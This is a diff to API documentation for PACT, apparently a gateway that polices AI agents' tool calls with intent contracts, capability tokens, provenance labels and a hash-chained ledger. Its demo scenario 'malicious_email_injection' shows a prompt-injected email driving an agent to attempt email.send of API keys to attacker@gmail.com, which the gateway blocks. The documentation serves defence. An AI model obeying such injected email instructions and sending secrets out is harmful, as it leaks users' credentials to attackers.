@@ -54,7 +54,8 @@ curl http://localhost:8000/health
 
 ```json
 {
-  "status": "healthy",
+  "status": "ok",
+  "service": "pact-backend",
   "version": "0.1.0"
 }
 ```
@@ -99,20 +100,23 @@ curl -X POST http://localhost:8000/agents/register \
   }'
 ```
 
-**Response:** `201 Created`
+**Response:** `200 OK`
 
 ```json
 {
-  "agent_id": "email-agent-001",
-  "owner": "team-pact",
-  "agent_type": "email_assistant",
-  "public_key": "base64-encoded-ed25519-public-key...",
-  "allowed_domains": ["email.read", "email.summarize", "respond_to_user"],
-  "risk_tier": "medium",
-  "issued_at": "2026-05-24T10:00:00Z",
-  "expires_at": "2026-06-24T10:00:00Z",
-  "issuer_signature": "base64-encoded-signature...",
-  "private_key": "base64-encoded-ed25519-private-key..."
+  "passport": {
+    "agent_id": "email-agent-001",
+    "owner": "team-pact",
+    "agent_type": "email_assistant",
+    "public_key": "base64-encoded-ed25519-public-key...",
+    "allowed_domains": ["email.read", "email.summarize", "respond_to_user"],
+    "risk_tier": "medium",
+    "issued_at": "2026-05-24T10:00:00Z",
+    "expires_at": "2026-06-24T10:00:00Z",
+    "issuer_signature": "base64-encoded-signature..."
+  },
+  "agent_private_key": "base64-encoded-ed25519-private-key...",
+  "warning": "Store the agent_private_key securely. It will not be shown again."
 }
 ```
 
@@ -141,6 +145,7 @@ curl http://localhost:8000/agents
     "agent_id": "email-agent-001",
     "owner": "team-pact",
     "agent_type": "email_assistant",
+    "allowed_domains": ["email.read", "email.summarize", "respond_to_user"],
     "risk_tier": "medium",
     "status": "active",
     "created_at": "2026-05-24T10:00:00Z",
@@ -150,6 +155,7 @@ curl http://localhost:8000/agents
     "agent_id": "web-agent-001",
     "owner": "team-pact",
     "agent_type": "web_researcher",
+    "allowed_domains": ["web.read", "summarize", "respond_to_user"],
     "risk_tier": "medium",
     "status": "active",
     "created_at": "2026-05-24T10:00:00Z",
@@ -202,26 +208,23 @@ Create an intent contract from a user's natural-language goal. The system classi
 
 ```json
 {
-  "user_goal": "Summarize my latest invoice email",
-  "agent_id": "email-agent-001"
+  "user_goal": "Summarize my latest invoice email"
 }
 ```
 
 | Field | Type | Required | Description |
 |---|---|---|---|
 | `user_goal` | string | Yes | The user's original goal in natural language |
-| `agent_id` | string | Yes | The agent this intent is created for |
 
 ```bash
 curl -X POST http://localhost:8000/intents/create \
   -H "Content-Type: application/json" \
   -d '{
-    "user_goal": "Summarize my latest invoice email",
-    "agent_id": "email-agent-001"
+    "user_goal": "Summarize my latest invoice email"
   }'
 ```
 
-**Response:** `201 Created`
+**Response:** `200 OK`
 
 ```json
 {
@@ -231,7 +234,8 @@ curl -X POST http://localhost:8000/intents/create \
   "forbidden_actions": ["email.send", "email.delete", "file.read_secret", "shell.execute_mock"],
   "risk_budget": "low",
   "approval_required_for": ["external_write", "delete", "payment", "secret_access", "shell"],
-  "intent_hash": "sha256:a1b2c3d4e5f6..."
+  "intent_hash": "sha256:a1b2c3d4e5f6...",
+  "created_at": "2026-05-24T10:00:00Z"
 }
 ```
 
@@ -262,7 +266,8 @@ curl http://localhost:8000/intents/intent_a1b2c3d4
   "forbidden_actions": ["email.send", "email.delete", "file.read_secret", "shell.execute_mock"],
   "risk_budget": "low",
   "approval_required_for": ["external_write", "delete", "payment", "secret_access", "shell"],
-  "intent_hash": "sha256:a1b2c3d4e5f6..."
+  "intent_hash": "sha256:a1b2c3d4e5f6...",
+  "created_at": "2026-05-24T10:00:00Z"
 }
 ```
 
@@ -275,6 +280,8 @@ curl http://localhost:8000/intents/intent_a1b2c3d4
 ---
 
 ## Capabilities
+
+> **Signature Coverage:** The signature covers only immutable token fields (`token_type`, `token_hash`, `agent_id`, `intent_hash`, `capability`, `resource`, `max_uses`, `expires_at`). The mutable field `uses_remaining` is **not** included in the signature — it is decremented on each use without invalidating the signature.
 
 ### POST /capabilities/issue
 
@@ -298,9 +305,9 @@ Issue a short-lived capability token granting an agent permission to use a speci
 | `agent_id` | string | Yes | Agent this token is issued to |
 | `intent_hash` | string | Yes | Intent contract hash this token is bound to |
 | `capability` | string | Yes | The specific tool action this token permits |
-| `resource` | string | Yes | The specific resource this token grants access to |
-| `max_uses` | integer | Yes | Maximum number of times this token can be used |
-| `ttl_seconds` | integer | Yes | Token lifetime in seconds |
+| `resource` | string | No | The specific resource this token grants access to (default: `"default"`) |
+| `max_uses` | integer | No | Maximum number of times this token can be used (default: 5) |
+| `ttl_seconds` | integer | No | Token lifetime in seconds (default: 300) |
 
 ```bash
 curl -X POST http://localhost:8000/capabilities/issue \
@@ -315,7 +322,7 @@ curl -X POST http://localhost:8000/capabilities/issue \
   }'
 ```
 
-**Response:** `201 Created`
+**Response:** `200 OK`
 
 ```json
 {
@@ -328,7 +335,7 @@ curl -X POST http://localhost:8000/capabilities/issue \
   "max_uses": 3,
   "uses_remaining": 3,
   "expires_at": "2026-05-24T10:05:00Z",
-  "signature": "base64-encoded-signature..."
+  "status": "active"
 }
 ```
 
@@ -343,7 +350,7 @@ curl -X POST http://localhost:8000/capabilities/issue \
 
 ### POST /capabilities/validate
 
-Validate a capability token. Checks expiry, agent binding, intent binding, capability match, and remaining uses.
+Validate a capability token. Checks token existence, status, agent binding, intent binding, capability match, resource binding (when provided), expiry, remaining uses, and signature verification.
 
 **Request Body:**
 
@@ -382,7 +389,7 @@ curl -X POST http://localhost:8000/capabilities/validate \
 ```json
 {
   "valid": true,
-  "reason": "Token is valid"
+  "reason": "Valid"
 }
 ```
 
@@ -396,6 +403,8 @@ curl -X POST http://localhost:8000/capabilities/validate \
 ```
 
 > **Note:** The `signature` covers only the immutable token fields (`token_type`, `token_hash`, `agent_id`, `intent_hash`, `capability`, `resource`, `max_uses`, `expires_at`). The mutable field `uses_remaining` is **not** included in the signature — it is decremented on each use without invalidating the signature.
+
+> **Resource Validation:** When the `resource` field is provided (non-empty), the validator checks that the token's `resource` matches the requested resource. When omitted or empty (the default), the resource binding check is skipped — the token is validated against agent, intent, and capability only.
 
 **Error Codes:**
 
@@ -480,12 +489,17 @@ curl -X POST http://localhost:8000/tools/call \
   "severity": "low",
   "reasons": ["Action is valid and aligned with intent"],
   "tool_result": {
-    "status": "success",
-    "output": "Invoice from Acme Corp for $1,250.00, due May 15.",
-    "output_labels": ["untrusted.email"]
+    "type": "email",
+    "id": "email-001",
+    "from": "acme-invoices@example.com",
+    "to": "user@example.com",
+    "subject": "Invoice #1234 from Acme Corp",
+    "body": "Please find attached invoice #1234 for $1,250.00 due May 15.",
+    "date": "2026-05-20T09:15:00Z",
+    "attachments": []
   },
-  "action_hash": "sha256:...",
-  "ledger_position": 1
+  "action_hash": "sha256:abc123...",
+  "run_id": "run_abc123"
 }
 ```
 
@@ -501,8 +515,8 @@ curl -X POST http://localhost:8000/tools/call \
     "External write influenced by untrusted email content"
   ],
   "tool_result": null,
-  "action_hash": "sha256:...",
-  "ledger_position": 2
+  "action_hash": "sha256:def456...",
+  "run_id": "run_abc123"
 }
 ```
 
@@ -511,8 +525,8 @@ curl -X POST http://localhost:8000/tools/call \
 | Code | Description |
 |---|---|
 | `400` | Missing or malformed envelope |
-| `401` | Invalid agent signature |
-| `403` | Action blocked by policy (also returned as 200 with `BLOCK` decision) |
+| `200` | Invalid agent signature (returned as 200 with `decision: BLOCK`) |
+| `200` | Action blocked by policy (returned as 200 with `decision: BLOCK`) |
 
 ---
 
@@ -569,6 +583,8 @@ curl http://localhost:8000/scenarios
 
 Execute a named demo scenario through the full PACT pipeline. The system creates the agent, intent, capability tokens, and runs all steps through the gateway automatically.
 
+> **Note:** `POST /scenarios/run/{name}` executes the scenario and returns summary stats. To retrieve the full run trace with actions and policy decisions, use `GET /runs/{run_id}` with the `run_id` from the response.
+
 ```bash
 curl -X POST http://localhost:8000/scenarios/run/malicious_email_injection
 ```
@@ -585,36 +601,11 @@ curl -X POST http://localhost:8000/scenarios/run/malicious_email_injection
 {
   "run_id": "run_x7y8z9",
   "scenario_name": "malicious_email_injection",
-  "agent_id": "email-agent-001",
-  "user_goal": "Summarize my latest invoice email",
   "status": "completed",
-  "total_steps": 2,
-  "allowed_count": 1,
-  "blocked_count": 1,
-  "max_risk_score": 96,
-  "max_severity": "critical",
-  "actions": [
-    {
-      "step_id": 0,
-      "tool": "email.read",
-      "decision": "ALLOW",
-      "risk_score": 0,
-      "severity": "low",
-      "reasons": ["Action is valid and aligned with intent"]
-    },
-    {
-      "step_id": 1,
-      "tool": "email.send",
-      "decision": "BLOCK",
-      "risk_score": 96,
-      "severity": "critical",
-      "reasons": [
-        "email.send not allowed by intent contract",
-        "External write influenced by untrusted email content"
-      ]
-    }
-  ],
-  "ledger_verified": true
+  "total_actions": 2,
+  "allowed_actions": 1,
+  "blocked_actions": 1,
+  "max_risk_score": 96
 }
 ```
 
@@ -648,7 +639,11 @@ curl http://localhost:8000/runs
     "status": "completed",
     "started_at": "2026-05-24T10:01:00Z",
     "completed_at": "2026-05-24T10:01:02Z",
-    "max_severity": "critical"
+    "total_actions": 2,
+    "allowed_actions": 1,
+    "blocked_actions": 1,
+    "max_risk_score": 96,
+    "ledger_valid": true
   }
 ]
 ```
@@ -677,43 +672,52 @@ curl http://localhost:8000/runs/run_x7y8z9
   "actions": [
     {
       "step_id": 0,
+      "agent_id": "email-agent-001",
       "tool": "email.read",
-      "args": {"email_id": "malicious_invoice_email"},
-      "decision": "ALLOW",
-      "risk_score": 0,
-      "severity": "low",
-      "reasons": ["Action is valid and aligned with intent"],
+      "args_digest": "sha256:...",
+      "intent_hash": "sha256:a1b2c3d4...",
       "provenance": {
         "influenced_by": ["trusted.user"],
         "uses_data": [],
         "side_effect": null
       },
-      "action_hash": "sha256:...",
       "parent_action_hash": null,
-      "timestamp": "2026-05-24T10:01:00Z"
+      "action_hash": "sha256:...",
+      "status": "allowed",
+      "created_at": "2026-05-24T10:01:00Z",
+      "policy_decision": {
+        "decision": "ALLOW",
+        "risk_score": 0,
+        "severity": "low",
+        "reasons": ["Action is valid and aligned with intent"]
+      }
     },
     {
       "step_id": 1,
+      "agent_id": "email-agent-001",
       "tool": "email.send",
-      "args": {"to": "attacker@gmail.com", "subject": "Stolen Data", "body": "API keys..."},
-      "decision": "BLOCK",
-      "risk_score": 96,
-      "severity": "critical",
-      "reasons": [
-        "email.send not allowed by intent contract",
-        "External write influenced by untrusted email content"
-      ],
+      "args_digest": "sha256:...",
+      "intent_hash": "sha256:a1b2c3d4...",
       "provenance": {
         "influenced_by": ["untrusted.email", "agent.generated"],
         "uses_data": [],
         "side_effect": "external_write"
       },
-      "action_hash": "sha256:...",
       "parent_action_hash": "sha256:...",
-      "timestamp": "2026-05-24T10:01:01Z"
+      "action_hash": "sha256:...",
+      "status": "blocked",
+      "created_at": "2026-05-24T10:01:01Z",
+      "policy_decision": {
+        "decision": "BLOCK",
+        "risk_score": 96,
+        "severity": "critical",
+        "reasons": [
+          "email.send not allowed by intent contract",
+          "External write influenced by untrusted email content"
+        ]
+      }
     }
-  ],
-  "ledger_verified": true
+  ]
 }
 ```
 
@@ -747,18 +751,36 @@ curl http://localhost:8000/runs/run_x7y8z9/replay
       "agent_id": "email-agent-001",
       "tool": "email.read",
       "args": {"email_id": "malicious_invoice_email"},
-      "envelope_hash": "sha256:...",
       "provenance": {
         "influenced_by": ["trusted.user"],
         "uses_data": [],
         "side_effect": null
       },
-      "decision": "ALLOW",
-      "risk_score": 0,
-      "severity": "low",
-      "reasons": ["Action is valid and aligned with intent"],
+      "envelope": {
+        "protocol": "PACT/0.1",
+        "run_id": "run_x7y8z9",
+        "step_id": 0,
+        "agent_id": "email-agent-001",
+        "tool": "email.read",
+        "args": {"email_id": "malicious_invoice_email"},
+        "args_digest": "sha256:...",
+        "intent_hash": "sha256:a1b2c3d4...",
+        "capability_token_hash": "sha256:...",
+        "provenance": {"influenced_by": ["trusted.user"], "uses_data": [], "side_effect": null},
+        "parent_action_hash": null,
+        "timestamp": "2026-05-24T10:01:00Z",
+        "agent_signature": "base64..."
+      },
+      "policy_decision": {
+        "decision": "ALLOW",
+        "risk_score": 0,
+        "severity": "low",
+        "reasons": ["Action is valid and aligned with intent"]
+      },
+      "action_hash": "sha256:...",
+      "parent_action_hash": null,
       "signature_valid": true,
-      "parent_hash": null
+      "chain_valid": true
     },
     {
       "step_id": 1,
@@ -766,24 +788,42 @@ curl http://localhost:8000/runs/run_x7y8z9/replay
       "agent_id": "email-agent-001",
       "tool": "email.send",
       "args": {"to": "attacker@gmail.com", "subject": "Stolen Data", "body": "API keys..."},
-      "envelope_hash": "sha256:...",
       "provenance": {
         "influenced_by": ["untrusted.email", "agent.generated"],
         "uses_data": [],
         "side_effect": "external_write"
       },
-      "decision": "BLOCK",
-      "risk_score": 96,
-      "severity": "critical",
-      "reasons": [
-        "email.send not allowed by intent contract",
-        "External write influenced by untrusted email content"
-      ],
+      "envelope": {
+        "protocol": "PACT/0.1",
+        "run_id": "run_x7y8z9",
+        "step_id": 1,
+        "agent_id": "email-agent-001",
+        "tool": "email.send",
+        "args": {"to": "attacker@gmail.com", "subject": "Stolen Data", "body": "API keys..."},
+        "args_digest": "sha256:...",
+        "intent_hash": "sha256:a1b2c3d4...",
+        "capability_token_hash": "sha256:...",
+        "provenance": {"influenced_by": ["untrusted.email", "agent.generated"], "uses_data": [], "side_effect": "external_write"},
+        "parent_action_hash": "sha256:...",
+        "timestamp": "2026-05-24T10:01:01Z",
+        "agent_signature": "base64..."
+      },
+      "policy_decision": {
+        "decision": "BLOCK",
+        "risk_score": 96,
+        "severity": "critical",
+        "reasons": [
+          "email.send not allowed by intent contract",
+          "External write influenced by untrusted email content"
+        ]
+      },
+      "action_hash": "sha256:...",
+      "parent_action_hash": "sha256:...",
       "signature_valid": true,
-      "parent_hash": "sha256:..."
+      "chain_valid": true
     }
   ],
-  "ledger_chain_valid": true
+  "ledger_valid": true
 }
 ```
 
@@ -808,22 +848,20 @@ curl http://localhost:8000/runs/run_x7y8z9/ledger/verify
 ```json
 {
   "run_id": "run_x7y8z9",
-  "total_actions": 2,
-  "chain_valid": true,
-  "chain": [
-    {
-      "step_id": 0,
-      "action_hash": "sha256:...",
-      "parent_action_hash": null,
-      "hash_valid": true
-    },
-    {
-      "step_id": 1,
-      "action_hash": "sha256:...",
-      "parent_action_hash": "sha256:...",
-      "hash_valid": true,
-      "parent_link_valid": true
-    }
+  "valid": true,
+  "issues": []
+}
+```
+
+If the chain is broken, `valid` is `false` and `issues` contains human-readable descriptions of each problem:
+
+```json
+{
+  "run_id": "run_x7y8z9",
+  "valid": false,
+  "issues": [
+    "Step 1: parent hash mismatch (expected sha256:abc..., got sha256:xyz...)",
+    "Step 1: hash mismatch (expected sha256:def..., got sha256:ghi...)"
   ]
 }
 ```
@@ -854,18 +892,30 @@ curl http://localhost:8000/dashboard/overview
   "total_actions": 14,
   "allowed_actions": 7,
   "blocked_actions": 6,
-  "approval_required_actions": 1,
   "critical_events": 4,
-  "max_risk_score": 100,
   "top_attacked_tools": [
     {"tool": "email.send", "count": 4},
     {"tool": "file.read_secret", "count": 1},
     {"tool": "shell.execute_mock", "count": 1}
   ],
-  "top_provenance_labels": [
-    {"label": "untrusted.email", "count": 3},
-    {"label": "external_write", "count": 5},
-    {"label": "secret", "count": 1}
+  "top_provenance_sources": [
+    {"source": "untrusted.email", "count": 3},
+    {"source": "external_write", "count": 5},
+    {"source": "secret", "count": 1}
+  ],
+  "risk_timeline": [
+    {
+      "timestamp": "2026-05-24T10:01:00Z",
+      "risk_score": 0,
+      "severity": "low",
+      "decision": "ALLOW"
+    },
+    {
+      "timestamp": "2026-05-24T10:02:00Z",
+      "risk_score": 96,
+      "severity": "critical",
+      "decision": "BLOCK"
+    }
   ]
 }
 ```
@@ -886,23 +936,21 @@ curl http://localhost:8000/dashboard/agents
 [
   {
     "agent_id": "email-agent-001",
-    "agent_type": "email_assistant",
+    "owner": "team-pact",
     "risk_tier": "medium",
-    "total_actions": 8,
-    "allowed_actions": 4,
+    "trust_score": 60,
+    "total_runs": 4,
     "blocked_actions": 4,
-    "max_risk_score": 100,
-    "last_active": "2026-05-24T10:05:00Z"
+    "status": "active"
   },
   {
     "agent_id": "web-agent-001",
-    "agent_type": "web_researcher",
+    "owner": "team-pact",
     "risk_tier": "medium",
-    "total_actions": 2,
-    "allowed_actions": 1,
+    "trust_score": 90,
+    "total_runs": 2,
     "blocked_actions": 1,
-    "max_risk_score": 100,
-    "last_active": "2026-05-24T10:04:00Z"
+    "status": "active"
   }
 ]
 ```
@@ -920,24 +968,22 @@ curl http://localhost:8000/dashboard/risk-timeline
 **Response:** `200 OK`
 
 ```json
-{
-  "timeline": [
-    {
-      "timestamp": "2026-05-24T10:01:00Z",
-      "run_id": "run_abc",
-      "scenario": "normal_email_summary",
-      "max_risk_score": 0,
-      "max_severity": "low"
-    },
-    {
-      "timestamp": "2026-05-24T10:02:00Z",
-      "run_id": "run_def",
-      "scenario": "malicious_email_injection",
-      "max_risk_score": 96,
-      "max_severity": "critical"
-    }
-  ]
-}
+[
+  {
+    "timestamp": "2026-05-24T10:01:00Z",
+    "risk_score": 0,
+    "severity": "low",
+    "decision": "ALLOW",
+    "run_id": "run_abc"
+  },
+  {
+    "timestamp": "2026-05-24T10:02:00Z",
+    "risk_score": 96,
+    "severity": "critical",
+    "decision": "BLOCK",
+    "run_id": "run_def"
+  }
+]
 ```
 
 ---
@@ -953,24 +999,21 @@ curl http://localhost:8000/dashboard/blocked-actions
 **Response:** `200 OK`
 
 ```json
-{
-  "blocked_actions": [
-    {
-      "run_id": "run_def",
-      "step_id": 1,
-      "agent_id": "email-agent-001",
-      "tool": "email.send",
-      "decision": "BLOCK",
-      "risk_score": 96,
-      "severity": "critical",
-      "reasons": [
-        "email.send not allowed by intent contract",
-        "External write influenced by untrusted email content"
-      ],
-      "timestamp": "2026-05-24T10:02:01Z"
-    }
-  ]
-}
+[
+  {
+    "run_id": "run_def",
+    "step_id": 1,
+    "agent_id": "email-agent-001",
+    "tool": "email.send",
+    "risk_score": 96,
+    "severity": "critical",
+    "reasons": [
+      "email.send not allowed by intent contract",
+      "External write influenced by untrusted email content"
+    ],
+    "timestamp": "2026-05-24T10:02:01Z"
+  }
+]
 ```
 
 ---
